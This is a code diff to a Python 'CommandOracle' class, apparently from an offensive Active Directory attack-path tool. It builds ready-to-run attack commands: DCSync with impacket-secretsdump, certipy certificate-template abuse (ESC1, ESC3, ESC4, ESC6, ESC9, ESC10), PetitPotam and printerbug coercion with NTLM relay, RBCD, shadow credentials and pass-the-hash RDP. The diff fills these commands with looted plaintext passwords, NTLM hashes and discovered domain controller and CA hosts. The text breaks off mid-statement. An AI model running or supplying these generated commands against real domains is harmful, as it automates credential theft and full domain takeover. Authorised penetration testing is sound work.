@@ -3,6 +3,7 @@
 from __future__ import annotations
 
 from dataclasses import dataclass
+from typing import Any
 from typing import TYPE_CHECKING
 
 from engine.loot import LootManager
@@ -74,13 +75,168 @@ class CommandOracle:
             return flags
         return self.loot_manager.build_auth_flags(source_node.name)
 
-    def _find_dc_for_domain(self, domain: str) -> str:
+    def _get_credential_record(self, node: NodeContext):
+        return self.loot_manager.get_credential(node.id) or self.loot_manager.get_credential(node.name)
+
+    def _get_node_attrs(self, node: NodeContext) -> dict[str, Any]:
+        if not self.graph_engine or not node.id or node.id not in self.graph_engine.graph:
+            return {}
+        attrs = self.graph_engine.graph.nodes.get(node.id, {})
+        return attrs if isinstance(attrs, dict) else {}
+
+    def _get_raw_properties(self, node: NodeContext) -> dict[str, Any]:
+        attrs = self._get_node_attrs(node)
+        raw_properties = attrs.get("raw_properties")
+        return raw_properties if isinstance(raw_properties, dict) else {}
+
+    def _lookup_node_value(self, node: NodeContext, *names: str) -> Any:
+        normalized_names = {name.casefold() for name in names}
+        attrs = self._get_node_attrs(node)
+        raw_properties = self._get_raw_properties(node)
+
+        for container in (attrs, raw_properties):
+            for key, value in container.items():
+                if str(key).casefold() in normalized_names and value not in (None, ""):
+                    return value
+
+        return None
+
+    def _list_node_values(self, node: NodeContext, *names: str) -> list[Any]:
+        value = self._lookup_node_value(node, *names)
+        if value is None:
+            return []
+        if isinstance(value, list):
+            return [item for item in value if item not in (None, "")]
+        return [value]
+
+    def _normalize_reference(self, value: Any) -> str:
+        if isinstance(value, dict):
+            for key in ("ObjectIdentifier", "ObjectId", "MemberId", "Name", "name"):
+                candidate = value.get(key)
+                if candidate:
+                    return str(candidate).strip().casefold()
+            return ""
+        return str(value or "").strip().casefold()
+
+    def _password_for_node(self, node: NodeContext, placeholder: str = "<PASSWORD>") -> str:
+        credential = self._get_credential_record(node)
+        if credential and credential.password:
+            return credential.password
+        return placeholder
+
+    def _hash_for_node(self, node: NodeContext, placeholder: str = "<NTLM_HASH>") -> str:
+        credential = self._get_credential_record(node)
+        if credential and credential.ntlm_hash:
+            return credential.ntlm_hash
+        return placeholder
+
+    def _password_or_hash_for_node(self, node: NodeContext, placeholder: str = "<PASSWORD_OR_HASH>") -> str:
+        credential = self._get_credential_record(node)
+        if credential:
+            if credential.password:
+                return credential.password
+            if credential.ntlm_hash:
+                return credential.ntlm_hash
+        return placeholder
+
+    def _find_dc_for_domain(self, domain: str, placeholder: str = "<DC_IP_OR_HOSTNAME>") -> str:
         """Find a DC hostname for the given domain, or return placeholder."""
         if not self.graph_engine or not domain:
-            return "<DC_IP_OR_HOSTNAME>"
+            return placeholder
         
         dc = self.graph_engine.find_dc_for_domain(domain)
-        return dc or "<DC_IP_OR_HOSTNAME>"
+        return dc or placeholder
+
+    def _find_enterprise_ca_node(self, source_node: NodeContext, target_node: NodeContext) -> NodeContext | None:
+        for candidate in (target_node, source_node):
+            if candidate.node_type == "enterpriseca" and candidate.id:
+                return candidate
+
+        template_candidates = [
+            candidate
+            for candidate in (target_node, source_node)
+            if candidate.node_type == "certtemplate" and (candidate.id or candidate.name)
+        ]
+        if self.graph_engine:
+            for template_node in template_candidates:
+                target_refs = {
+                    self._normalize_reference(template_node.id),
+                    self._normalize_reference(template_node.name),
+                }
+                for node_id, attrs in self.graph_engine.graph.nodes(data=True):
+                    if str(attrs.get("type", "")).casefold() != "enterpriseca":
+                        continue
+                    ca_context = NodeContext(
+                        id=str(node_id),
+                        name=str(attrs.get("name", node_id)),
+                        node_type=str(attrs.get("type", "enterpriseca")),
+                        spn=str(attrs.get("spn", "")),
+                        domain=str(attrs.get("domain", "")),
+                    )
+                    for key in (
+                        "EnabledCertTemplates",
+                        "enabledcerttemplates",
+                        "PublishedTemplates",
+                        "publishedtemplates",
+                        "CertificateTemplates",
+                        "certificatetemplates",
+                        "Templates",
+                        "templates",
+                    ):
+                        references = {
+                            self._normalize_reference(value)
+                            for value in self._list_node_values(ca_context, key)
+                        }
+                        if references & target_refs:
+                            return ca_context
+
+            for node_id, attrs in self.graph_engine.graph.nodes(data=True):
+                if str(attrs.get("type", "")).casefold() != "enterpriseca":
+                    continue
+                return NodeContext(
+                    id=str(node_id),
+                    name=str(attrs.get("name", node_id)),
+                    node_type=str(attrs.get("type", "enterpriseca")),
+                    spn=str(attrs.get("spn", "")),
+                    domain=str(attrs.get("domain", "")),
+                )
+
+        return None
+
+    def _resolve_ca_name(self, ca_node: NodeContext | None, placeholder: str = "<CA-NAME>") -> str:
+        if not ca_node:
+            return placeholder
+        for key in ("caname", "CAName", "displayname", "DisplayName"):
+            value = self._lookup_node_value(ca_node, key)
+            if value:
+                return str(value).strip()
+        return ca_node.name or placeholder
+
+    def _resolve_ca_server(self, ca_node: NodeContext | None, placeholder: str = "<CA-SERVER>") -> str:
+        if not ca_node:
+            return placeholder
+
+        for key in (
+            "dnshostname",
+            "dNSHostName",
+            "dnsname",
+            "DNSName",
+            "hostname",
+            "HostName",
+            "computername",
+            "ComputerName",
+            "machineaccount",
+            "MachineAccount",
+        ):
+            value = self._lookup_node_value(ca_node, key)
+            if value:
+                return str(value).strip().rstrip("$")
+
+        ca_name = ca_node.name or ""
+        if "\\" in ca_name:
+            return ca_name.split("\\", maxsplit=1)[0].strip() or placeholder
+
+        return placeholder
 
     def get_exploit_command(
         self,
@@ -108,6 +264,13 @@ class CommandOracle:
         username = self._infer_username(source)
         auth_flags = self._auth_flags(source)
         auth_part = f" {auth_flags}" if auth_flags else ""
+        source_password = self._password_for_node(source)
+        source_ntlm_hash = self._hash_for_node(source)
+        dc_host = self._find_dc_for_domain(domain)
+        dc_ip = self._find_dc_for_domain(domain, "<DC_IP>")
+        ca_node = self._find_enterprise_ca_node(source, target)
+        ca_name = self._resolve_ca_name(ca_node)
+        ca_server = self._resolve_ca_server(ca_node)
 
         normalized_edge = edge_type or "Unknown"
 
@@ -115,7 +278,7 @@ class CommandOracle:
             if target.node_type == "domain":
                 target_domain = target.name or domain
                 return (
-                    f"impacket-secretsdump{auth_part} {target_domain}/{username}@<TARGET_DC_HOST> "
+                    f"impacket-secretsdump{auth_part} {target_domain}/{username}@{self._find_dc_for_domain(target_domain, '<TARGET_DC_HOST>')} "
                     "-just-dc"
                 )
 
@@ -138,7 +301,7 @@ class CommandOracle:
                 f"# {normalized_edge}: replication right detected on {target_domain}\n"
                 "# DCSync requires BOTH GetChanges and GetChangesAll on the same domain object\n"
                 "# Verify edge pair in graph, then execute DCSync:\n"
-                f"impacket-secretsdump{auth_part} {domain}/{username}@<TARGET_DC> -just-dc"
+                f"impacket-secretsdump{auth_part} {domain}/{username}@{self._find_dc_for_domain(target_domain, '<TARGET_DC>')} -just-dc"
             )
 
         if normalized_edge == "Contains":
@@ -163,7 +326,7 @@ class CommandOracle:
             return (
                 "# DCFor: source host is a Domain Controller for the target domain\n"
                 "# If you have administrative access on this DC, domain compromise is typically one step away\n"
-                f"impacket-secretsdump{auth_part} {domain}/{username}@<TARGET_DC_HOST> -just-dc\n"
+                f"impacket-secretsdump{auth_part} {domain}/{username}@{source.name or self._find_dc_for_domain(target_domain, '<TARGET_DC_HOST>')} -just-dc\n"
                 f"# Target domain: {target_domain}"
             )
 
@@ -195,13 +358,13 @@ class CommandOracle:
                 "# DelegatedEnrollmentAgent: enrollment-agent delegation relationship (not sufficient by itself)\n"
                 "# ESC3 requires this relationship plus a compatible Enrollment Agent cert/template path\n"
                 "# 1) Enroll Enrollment Agent certificate\n"
-                f"certipy-ad req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> -target <CA-SERVER> "
+                f"certipy-ad req -u {username}@{domain} -p {source_password} -ca {ca_name} -target {ca_server} "
                 "-template <ENROLLMENT_AGENT_TEMPLATE>\n"
                 "# 2) Request cert on behalf of another principal using delegated template\n"
-                f"certipy-ad req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> -target <CA-SERVER> "
+                f"certipy-ad req -u {username}@{domain} -p {source_password} -ca {ca_name} -target {ca_server} "
                 f"-template {template} -on-behalf-of <TARGET_USER> -pfx <AGENT_CERT>.pfx\n"
                 "# 3) Authenticate as target principal\n"
-                "certipy-ad auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
+                f"certipy-ad auth -pfx <TARGET_USER>.pfx -dc-ip {dc_ip}"
             )
 
         if normalized_edge == "Enroll":
@@ -211,8 +374,8 @@ class CommandOracle:
                     "# Enroll on EnterpriseCA: CA enrollment right is only one requirement for issuance\n"
                     "# You still need enrollment rights on a published certificate template and must satisfy template issuance requirements\n"
                     f"# Target CA: {target_name}\n"
-                    f"certipy-ad req -u {username}@{domain} -p <PASSWORD> -ca {target_name} "
-                    "-target <CA-SERVER> -template <PUBLISHED_TEMPLATE>\n"
+                    f"certipy-ad req -u {username}@{domain} -p {source_password} -ca {target_name} "
+                    f"-target {ca_server} -template <PUBLISHED_TEMPLATE>\n"
                     f"Certify.exe request --ca {target_name} --template <PUBLISHED_TEMPLATE>"
                 )
 
@@ -220,14 +383,15 @@ class CommandOracle:
             return (
                 "# Enroll: request a certificate from a published template\n"
                 "# Requirements: the template must be published on an Enterprise CA, you must also have Enroll on that CA, and you must satisfy issuance/SAN constraints\n"
-                f"certipy-ad req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> -target <CA-SERVER> -template {template}\n"
-                f"Certify.exe request --ca <CA-SERVER>\\<CA-NAME> --template {template}"
+                f"certipy-ad req -u {username}@{domain} -p {source_password} -ca {ca_name} -target {ca_server} -template {template}\n"
+                f"Certify.exe request --ca {ca_server}\\{ca_name} --template {template}"
             )
 
         if normalized_edge == "EnrollOnBehalfOf":
             source_template = source.name or "<ENROLLMENT_AGENT_TEMPLATE>"
             target_template = target.name or "<ON_BEHALF_TEMPLATE>"
             operator_user = username
+            operator_password = source_password
             if source.node_type == "certtemplate":
                 operator_user = "<USER>"
                 all_creds = self.loot_manager.all_credentials()
@@ -238,15 +402,16 @@ class CommandOracle:
                         or str(first_cred.get("principal") or "").split("\\")[-1]
                         or operator_user
                     )
+                    operator_password = str(first_cred.get("password") or "").strip() or operator_password
             return (
                 "# EnrollOnBehalfOf: ESC3-style template-to-template relationship, not sufficient by itself\n"
                 "# You still need a principal that can enroll the source Enrollment Agent template and a CA path that permits on-behalf-of enrollment\n"
                 "# 1) Enroll an Enrollment Agent certificate from the source template\n"
-                f"certipy-ad req -u {operator_user}@{domain} -p <PASSWORD> -ca <CA-NAME> -target <CA-SERVER> -template {source_template}\n"
+                f"certipy-ad req -u {operator_user}@{domain} -p {operator_password or '<PASSWORD>'} -ca {ca_name} -target {ca_server} -template {source_template}\n"
                 "# 2) Use that agent certificate to request a cert from the target template on behalf of another principal\n"
-                f"certipy-ad req -u {operator_user}@{domain} -p <PASSWORD> -ca <CA-NAME> -target <CA-SERVER> -template {target_template} -on-behalf-of <DOMAIN>\\<TARGET_USER> -pfx <AGENT_CERT>.pfx\n"
+                f"certipy-ad req -u {operator_user}@{domain} -p {operator_password or '<PASSWORD>'} -ca {ca_name} -target {ca_server} -template {target_template} -on-behalf-of <DOMAIN>\\<TARGET_USER> -pfx <AGENT_CERT>.pfx\n"
                 "# 3) Authenticate with the issued certificate as the impersonated principal\n"
-                "certipy-ad auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
+                f"certipy-ad auth -pfx <TARGET_USER>.pfx -dc-ip {dc_ip}"
             )
 
         if normalized_edge == "ExtendedByPolicy":
@@ -346,7 +511,7 @@ class CommandOracle:
                 target_group = target_group.split("@", maxsplit=1)[0]
             
             member_to_add = "<MEMBER_TO_ADD>"
-            target_host = "<TARGET_DOMAIN_CONTROLLER>"
+            target_host = self._find_dc_for_domain(domain, "<TARGET_DOMAIN_CONTROLLER>")
             return (
                 "# AddMember: add controlled principal into target group\n"
                 f"powershell -c \"Add-DomainGroupMember -Identity '{target_group}' -Members '{member_to_add}'\"\n"
@@ -382,7 +547,7 @@ class CommandOracle:
                 "# CanRDP: open interactive RDP session to target host\n"
                 f"xfreerdp /u:{username} /d:{domain} /v:{target_host}\n"
                 "# Pass-the-hash variant (requires Restricted Admin mode on target)\n"
-                "xfreerdp /pth:<NTLM_HASH> /u:<USER> /d:<DOMAIN> /v:<TARGET_HOST>"
+                f"xfreerdp /pth:{source_ntlm_hash} /u:{username} /d:{domain} /v:{target_host}"
             )
 
         # ClaimSpecialIdentity
@@ -401,21 +566,21 @@ class CommandOracle:
             target_host = target.name or "<TARGET_COMPUTER>"
             return (
                 "# CoerceAndRelayNTLMToADCS: coerce NTLM auth and relay to ADCS web enrollment\n"
-                "impacket-ntlmrelayx -t http://<ADCS_SERVER>/certsrv/ --adcs --template <TEMPLATE> -smb2support\n"
+                f"impacket-ntlmrelayx -t http://{ca_server}/certsrv/ --adcs --template <TEMPLATE> -smb2support\n"
                 "# Trigger coercion from target (example)\n"
                 f"SpoolSample.exe {target_host} <ATTACKER_NETBIOS>@<PORT>/file.txt\n"
                 "# Then use issued certificate for auth\n"
-                "certipy-ad auth -pfx <TARGET>.pfx -dc-ip <DC_IP>"
+                f"certipy-ad auth -pfx <TARGET>.pfx -dc-ip {dc_ip}"
             )
 
         if normalized_edge == "CoerceAndRelayNTLMToLDAP":
             target_host = target.name or "<TARGET_COMPUTER>"
             return (
                 "# CoerceAndRelayNTLMToLDAP: WebClient-based coercion relayed to LDAP on a DC without LDAP signing\n"
-                "ntlmrelayx.py -t ldap://<DOMAIN_CONTROLLER_IP> --shadow-credentials --shadow-target '<TARGET_COMPUTER>$'\n"
+                f"ntlmrelayx.py -t ldap://{dc_ip} --shadow-credentials --shadow-target '<TARGET_COMPUTER>$'\n"
                 "# Alternative follow-up: use --delegate-access for RBCD instead of shadow credentials\n"
                 "# Trigger coercion from the target computer to your listener\n"
-                f"petitpotam.py -d '{domain}' -u '{username}' -p '<PASSWORD>' '<ATTACKER_NETBIOS>@<PORT>/file.txt' '{target_host}'\n"
+                f"petitpotam.py -d '{domain}' -u '{username}' -p '{source_password}' '<ATTACKER_NETBIOS>@<PORT>/file.txt' '{target_host}'\n"
                 "# Authenticate with the generated certificate or continue with the RBCD chain"
             )
 
@@ -423,10 +588,10 @@ class CommandOracle:
             target_host = target.name or "<TARGET_COMPUTER>"
             return (
                 "# CoerceAndRelayNTLMToLDAPS: WebClient-based coercion relayed to LDAPS on a DC without channel binding\n"
-                "ntlmrelayx.py -t ldaps://<DOMAIN_CONTROLLER_IP> --shadow-credentials --shadow-target '<TARGET_COMPUTER>$'\n"
+                f"ntlmrelayx.py -t ldaps://{dc_ip} --shadow-credentials --shadow-target '<TARGET_COMPUTER>$'\n"
                 "# Alternative follow-up: use --delegate-access for RBCD instead of shadow credentials\n"
                 "# Trigger coercion from the target computer to your listener\n"
-                f"petitpotam.py -d '{domain}' -u '{username}' -p '<PASSWORD>' '<ATTACKER_NETBIOS>@<PORT>/file.txt' '{target_host}'\n"
+                f"petitpotam.py -d '{domain}' -u '{username}' -p '{source_password}' '<ATTACKER_NETBIOS>@<PORT>/file.txt' '{target_host}'\n"
                 "# Authenticate with the generated certificate or continue with the RBCD chain"
             )
 
@@ -436,7 +601,7 @@ class CommandOracle:
                 "# CoerceAndRelayNTLMToSMB: coerce a victim computer and relay its NTLM auth to SMB on a signing-disabled target\n"
                 f"ntlmrelayx.py -t smb://{target_host} -smb2support\n"
                 "# Trigger coercion from a machine that is admin on the target\n"
-                "printerbug.py '<DOMAIN>/<USER>:<PASSWORD>'@<VICTIM_COMPUTER_IP> <ATTACKER_IP>\n"
+                f"printerbug.py '{domain}/{username}:{source_password}'@<VICTIM_COMPUTER_IP> <ATTACKER_IP>\n"
                 "# If the relay succeeds, use the relayed shell or SMB session to execute commands on the target"
             )
 
@@ -445,13 +610,13 @@ class CommandOracle:
             return (
                 "# CoerceToTGT: abuse unconstrained delegation to capture a Tier Zero TGT, then DCSync\n"
                 "# 1) On the unconstrained-delegation host, monitor for incoming TGTs\n"
-                "Rubeus.exe request monitor /user:<TARGET_DC_DNS_NAME> /interval:5 /nowrap\n"
+                f"Rubeus.exe request monitor /user:{dc_host} /interval:5 /nowrap\n"
                 "# 2) Coerce the DC or other Tier Zero principal to authenticate to the compromised host\n"
-                "printerbug.py '<DOMAIN>/<USER>:<PASSWORD>'@<TARGET_DC_IP> <COMPROMISED_HOST_IP>\n"
+                f"printerbug.py '{domain}/{username}:{source_password}'@{dc_ip} <COMPROMISED_HOST_IP>\n"
                 "# 3) Convert/inject the captured ticket and use it for replication\n"
                 "ticketConverter.py ticket.kirbi ticket.ccache\n"
                 "export KRB5CCNAME=$PWD/ticket.ccache\n"
-                f"secretsdump.py -k -just-dc-user <DOMAIN/TARGETUSER> <TARGET_DC_DNS>\n"
+                f"secretsdump.py -k -just-dc-user <DOMAIN/TARGETUSER> {dc_host}\n"
                 f"# Target domain: {target_domain}"
             )
 
@@ -460,7 +625,7 @@ class CommandOracle:
             target_computer = target.name or "<TARGET_COMPUTER>"
             return (
                 "# AllowedToAct / AddAllowedToAct: abuse resource-based constrained delegation (RBCD)\n"
-                f"impacket-rbcd{auth_part} -dc-ip <DC_IP> -action write "
+                f"impacket-rbcd{auth_part} -dc-ip {dc_ip} -action write "
                 f"-delegate-from '<CONTROLLED_COMPUTER>$' -delegate-to '{target_computer}' "
                 f"{domain}/{username}\n"
                 "# Follow up with S4U to impersonate a user to the target service\n"
@@ -484,7 +649,7 @@ class CommandOracle:
             target_host = target.name or "<TARGET_COMPUTER>"
             return (
                 "# CanPSRemote: open remote PowerShell session and execute commands\n"
-                "$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force\n"
+                f"$SecPassword = ConvertTo-SecureString '{source_password}' -AsPlainText -Force\n"
                 f"$Cred = New-Object System.Management.Automation.PSCredential('{domain}\\{username}', $SecPassword)\n"
                 f"$session = New-PSSession -ComputerName {target_host} -Credential $Cred\n"
                 "Invoke-Command -Session $session -ScriptBlock { whoami }\n"
@@ -499,7 +664,7 @@ class CommandOracle:
                 f"pywhisker -d {domain} -u {username}{auth_part} "
                 f"--target '{target_principal}' --action add\n"
                 "# Then request TGT as target with PKINIT\n"
-                "certipy-ad auth -pfx <TARGET>.pfx -dc-ip <DC_IP>"
+                f"certipy-ad auth -pfx <TARGET>.pfx -dc-ip {dc_ip}"
             )
 
         # AllExtendedRights
@@ -513,7 +678,7 @@ class CommandOracle:
                     target_user = target_user.split("@", maxsplit=1)[0]
                 
                 new_password = "<NEW_PASSWORD>"
-                target_host = "<TARGET_HOST>"
+                target_host = self._find_dc_for_domain(domain, "<TARGET_HOST>")
                 return (
                     f"impacket-psexec{auth_part} {domain}/{username}@{target_host} "
                     f"'net user {target_user} {new_password}'"
@@ -530,15 +695,15 @@ class CommandOracle:
                 target_dc = target.name or "<DC_HOST>"
                 return (
                     "# AllExtendedRights on DOMAIN can include replication rights (DCSync)\n"
-                    f"impacket-secretsdump{auth_part} {domain}/{username}@{target_dc} -just-dc"
+                    f"impacket-secretsdump{auth_part} {domain}/{username}@{self._find_dc_for_domain(target_dc, '<DC_HOST>')} -just-dc"
                 )
 
             if target.node_type == "certtemplate":
                 target_template = target.name or "<TEMPLATE>"
                 return (
                     "# AllExtendedRights on CertTemplate grants enrollment rights (if CA publish/issuance prereqs are met)\n"
-                    f"certipy-ad req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
-                    f"-target <CA-SERVER> -template {target_template}"
+                    f"certipy-ad req -u {username}@{domain} -p {source_password} -ca {ca_name} "
+                    f"-target {ca_server} -template {target_template}"
                 )
 
             target_object = target.name or target.id or "<TARGET_OBJECT>"
@@ -590,9 +755,9 @@ class CommandOracle:
                 return (
                     f"# GenericWrite on GROUP: add controlled principal to group\n"
                     f"net rpc group addmem '{target_object}' '<CONTROLLED_USER>' "
-                    f"-U '{domain}/{username}%<PASSWORD_OR_HASH>' -S <DC_HOST>\n"
+                    f"-U '{domain}/{username}%{self._password_or_hash_for_node(source)}' -S {self._find_dc_for_domain(domain, '<DC_HOST>')}\n"
                     f"# or\n"
-                    f"bloodyAD --host <DC_IP> -d {domain} -u {username}{auth_part} "
+                    f"bloodyAD --host {dc_ip} -d {domain} -u {username}{auth_part} "
                     f"add groupMember '{target_object}' '<CONTROLLED_USER>'"
                 )
 
@@ -603,7 +768,7 @@ class CommandOracle:
                     f"pywhisker -d {domain} -u {username}{auth_part} "
                     f"--target '{target_object}' --action add\n"
                     f"# 2) RBCD path (set msDS-AllowedToActOnBehalfOfOtherIdentity)\n"
-                    f"impacket-rbcd{auth_part} -dc-ip <DC_IP> -action write "
+                    f"impacket-rbcd{auth_part} -dc-ip {dc_ip} -action write "
                     f"-delegate-from '<CONTROLLED_COMPUTER>$' -delegate-to '{target_object}' "
                     f"{domain}/{username}"
                 )
@@ -650,10 +815,10 @@ class CommandOracle:
         if normalized_edge == "ADCSESC1":
             return (
                 "# ADCS ESC1: enroll auth-capable cert with arbitrary SAN/UPN\n"
-                f"certipy-ad req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
-                f"-target <CA-SERVER> -template <VULN_TEMPLATE> -upn <TARGET_USER>@{domain}\n"
+                f"certipy-ad req -u {username}@{domain} -p {source_password} -ca {ca_name} "
+                f"-target {ca_server} -template <VULN_TEMPLATE> -upn <TARGET_USER>@{domain}\n"
                 "# Use issued certificate to authenticate as target\n"
-                "certipy-ad auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
+                f"certipy-ad auth -pfx <TARGET_USER>.pfx -dc-ip {dc_ip}"
             )
 
         # ADCS ESC3
@@ -661,14 +826,14 @@ class CommandOracle:
             return (
                 "# ADCS ESC3: abuse Enrollment Agent to request cert on behalf of another principal\n"
                 "# 1) Enroll Enrollment Agent cert\n"
-                f"certipy-ad req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
-                "-target <CA-SERVER> -template <ENROLLMENT_AGENT_TEMPLATE>\n"
+                f"certipy-ad req -u {username}@{domain} -p {source_password} -ca {ca_name} "
+                f"-target {ca_server} -template <ENROLLMENT_AGENT_TEMPLATE>\n"
                 "# 2) Request on-behalf-of cert for target principal\n"
-                f"certipy-ad req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
-                "-target <CA-SERVER> -template <AUTH_TEMPLATE> -on-behalf-of <TARGET_USER> "
+                f"certipy-ad req -u {username}@{domain} -p {source_password} -ca {ca_name} "
+                f"-target {ca_server} -template <AUTH_TEMPLATE> -on-behalf-of <TARGET_USER> "
                 "-pfx <AGENT_CERT>.pfx\n"
                 "# 3) Authenticate as target\n"
-                "certipy-ad auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
+                f"certipy-ad auth -pfx <TARGET_USER>.pfx -dc-ip {dc_ip}"
             )
 
         # ADCS ESC4
@@ -679,105 +844,109 @@ class CommandOracle:
                 "impacket-dacledit -action write -rights FullControl -principal <ATTACKER> "
                 "-target-dn '<CERT_TEMPLATE_DN>' <DOMAIN>/<USER>:<PASS>\n"
                 "# Reconfigure template (Linux certipy-ad shortcut)\n"
-                f"certipy-ad template -username {username}@{domain} -password <PASSWORD> "
+                f"certipy-ad template -username {username}@{domain} -password {source_password} "
                 "-template <TEMPLATE_CN> -save-old\n"
                 "# Then execute ESC1 using the now-vulnerable template\n"
-                f"certipy-ad req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
-                "-target <CA-SERVER> -template <TEMPLATE_CN> -upn <TARGET_USER>@<DOMAIN>\n"
-                "certipy-ad auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
+                f"certipy-ad req -u {username}@{domain} -p {source_password} -ca {ca_name} "
+                f"-target {ca_server} -template <TEMPLATE_CN> -upn <TARGET_USER>@<DOMAIN>\n"
+                f"certipy-ad auth -pfx <TARGET_USER>.pfx -dc-ip {dc_ip}"
             )
 
         # ADCS ESC6a
         if normalized_edge in ("ADCSESC6a", "ADCSESC6A"):
             return (
                 "# ADCS ESC6a: CA EDITF_ATTRIBUTESUBJECTALTNAME2 allows arbitrary SAN impersonation\n"
-                f"certipy-ad req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
-                "-target <CA-SERVER> -template <PUBLISHED_TEMPLATE> -upn <TARGET_USER>@<DOMAIN>\n"
+                f"certipy-ad req -u {username}@{domain} -p {source_password} -ca {ca_name} "
+                f"-target {ca_server} -template <PUBLISHED_TEMPLATE> -upn <TARGET_USER>@<DOMAIN>\n"
                 "# If strong mapping is enforced, include SID URL (commonly via Certify on Windows)\n"
                 "# Certify.exe request --ca <CA> --template <TEMPLATE> --upn <TARGET> --sid-url <TARGET_SID>\n"
-                "certipy-ad auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
+                f"certipy-ad auth -pfx <TARGET_USER>.pfx -dc-ip {dc_ip}"
             )
 
         # ADCS ESC6b
         if normalized_edge in ("ADCSESC6b", "ADCSESC6B"):
             return (
                 "# ADCS ESC6b: CA allows arbitrary SAN and target DC allows weak mapping\n"
-                f"certipy-ad req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
-                "-target <CA-SERVER> -template <PUBLISHED_TEMPLATE> -upn <TARGET_USER>@<DOMAIN>\n"
+                f"certipy-ad req -u {username}@{domain} -p {source_password} -ca {ca_name} "
+                f"-target {ca_server} -template <PUBLISHED_TEMPLATE> -upn <TARGET_USER>@<DOMAIN>\n"
                 "# Authenticate as target with weak cert mapping on affected DC\n"
-                "certipy-ad auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
+                f"certipy-ad auth -pfx <TARGET_USER>.pfx -dc-ip {dc_ip}"
             )
 
         # ADCS ESC9a
         if normalized_edge in ("ADCSESC9a", "ADCSESC9A"):
             victim = source.name or "<VICTIM_PRINCIPAL>"
+            victim_password = self._password_for_node(source, "<VICTIM_PASSWORD>")
             return (
                 "# ADCS ESC9a: weak mapping + no security extension + controlled victim UPN\n"
-                f"certipy-ad account update -u {username}@{domain} -p <PASSWORD> "
+                f"certipy-ad account update -u {username}@{domain} -p {source_password} "
                 f"-user {victim} -upn <TARGET_SAMACCOUNTNAME>\n"
                 "# Enroll cert as victim\n"
-                f"certipy-ad req -u {victim} -p <VICTIM_PASSWORD> -ca <CA-NAME> "
-                "-target <CA-SERVER> -template <VULN_TEMPLATE>\n"
+                f"certipy-ad req -u {victim} -p {victim_password} -ca {ca_name} "
+                f"-target {ca_server} -template <VULN_TEMPLATE>\n"
                 "# Restore victim UPN and authenticate as target on weak-mapping DC\n"
-                f"certipy-ad account update -u {username}@{domain} -p <PASSWORD> "
+                f"certipy-ad account update -u {username}@{domain} -p {source_password} "
                 f"-user {victim} -upn <ORIGINAL_UPN>\n"
-                "certipy-ad auth -pfx <TARGET>.pfx -dc-ip <DC_IP>"
+                f"certipy-ad auth -pfx <TARGET>.pfx -dc-ip {dc_ip}"
             )
 
         # ADCS ESC9b
         if normalized_edge in ("ADCSESC9b", "ADCSESC9B"):
             victim = source.name or "<VICTIM_COMPUTER>$"
+            victim_password = self._password_for_node(source, "<VICTIM_PASSWORD>")
             return (
                 "# ADCS ESC9b: weak mapping + no security extension + controlled victim dNSHostName\n"
                 "# 1) Remove conflicting SPNs for victim if needed\n"
-                f"certipy-ad account update -u {username}@{domain} -p <PASSWORD> "
+                f"certipy-ad account update -u {username}@{domain} -p {source_password} "
                 f"-user {victim} -dns <TARGET_HOST>.{domain}\n"
                 "# 2) Enroll cert as victim computer\n"
-                f"certipy-ad req -u {victim} -p <VICTIM_PASSWORD> -ca <CA-NAME> "
-                "-target <CA-SERVER> -template <VULN_TEMPLATE>\n"
+                f"certipy-ad req -u {victim} -p {victim_password} -ca {ca_name} "
+                f"-target {ca_server} -template <VULN_TEMPLATE>\n"
                 "# 3) (Optional) restore victim dNSHostName/SPN, then authenticate as target computer\n"
-                "certipy-ad auth -pfx <TARGET_HOST>.pfx -dc-ip <DC_IP>"
+                f"certipy-ad auth -pfx <TARGET_HOST>.pfx -dc-ip {dc_ip}"
             )
 
         # ADCS ESC10a
         if normalized_edge == "ADCSESC10a":
             victim = source.name or "<VICTIM_PRINCIPAL>"
+            victim_password = self._password_for_node(source, "<VICTIM_PASSWORD>")
             return (
                 "# ADCS ESC10a: UPN mapping abuse via controlled victim principal\n"
-                f"certipy-ad account update -u {username}@{domain} -p <PASSWORD> "
+                f"certipy-ad account update -u {username}@{domain} -p {source_password} "
                 f"-user {victim} -upn <TARGET_SAM>@{domain}\n"
                 "# Enroll certificate as victim on affected template/CA\n"
-                f"certipy-ad req -u {victim} -p <VICTIM_PASSWORD> -ca <CA-NAME> "
-                "-target <CA-SERVER> -template <VULN_TEMPLATE>\n"
+                f"certipy-ad req -u {victim} -p {victim_password} -ca {ca_name} "
+                f"-target {ca_server} -template <VULN_TEMPLATE>\n"
                 "# Restore victim UPN and authenticate with issued cert\n"
-                f"certipy-ad account update -u {username}@{domain} -p <PASSWORD> -user {victim} -upn <ORIGINAL_UPN>\n"
-                "certipy-ad auth -pfx <TARGET>.pfx -dc-ip <DC_IP> -ldap-shell"
+                f"certipy-ad account update -u {username}@{domain} -p {source_password} -user {victim} -upn <ORIGINAL_UPN>\n"
+                f"certipy-ad auth -pfx <TARGET>.pfx -dc-ip {dc_ip} -ldap-shell"
             )
 
         # ADCS ESC10b
         if normalized_edge == "ADCSESC10b":
             victim = source.name or "<VICTIM_COMPUTER>$"
+            victim_password = self._password_for_node(source, "<VICTIM_PASSWORD>")
             return (
                 "# ADCS ESC10b: dNSHostName mapping abuse via controlled computer\n"
                 "# 1) Remove conflicting SPNs on victim if needed\n"
                 "# 2) Set victim dNSHostName to target computer FQDN\n"
-                f"certipy-ad account update -u {username}@{domain} -p <PASSWORD> "
+                f"certipy-ad account update -u {username}@{domain} -p {source_password} "
